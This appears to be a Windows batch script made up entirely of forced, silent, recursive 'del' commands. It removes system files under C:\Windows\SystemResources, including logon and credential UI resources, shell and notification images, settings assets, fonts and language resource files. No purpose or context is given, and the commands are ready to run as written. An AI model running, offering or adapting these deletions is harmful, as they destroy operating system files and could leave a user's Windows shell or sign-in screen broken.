del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS\Windows.UI.AccountsControl.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback\Windows.UI.BioFeedback.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts\NUIMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris\Windows.UI.BioFeedback.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\Windows.UI.BlockedShutdown.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris\Windows.UI.BlockedShutdown.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Cred\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Cred\Windows.UI.Cred.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Cred\pris\Windows.UI.Cred.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Logon\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Logon\Windows.UI.Logon.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Logon\pris\Windows.UI.Logon.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\Windows.UI.PCShell.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets\SharMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell\pris\Windows.UI.PCShell.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PrintDialog\Windows.UI.PrintDialog.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris\Windows.UI.PrintDialog.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Windows.UI.Search.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-140.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-180.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-80.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-140.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-180.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-80.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-140.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-180.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-80.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search\pris\Windows.UI.Search.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\Windows.UI.SettingsAdminFlowUIThreshold.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts\SetMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\Windows.UI.SettingsAppThreshold.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris\Windows.UI.SettingsAppThreshold.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\EdrCalibration.mkv" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\HDRSample.mkv" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\SDRSample.mkv" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPIcons.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\BitMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\MemMDL2.2.2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SetMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SettingsIcons.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\Windows.UI.SettingsHandlers-nt.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Windows.UI.Shell.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell\pris\Windows.UI.Shell.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Windows.UI.ShellCommon.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts\CoreMDL2.1.69.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts\MiraMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400.png" /f /s /q
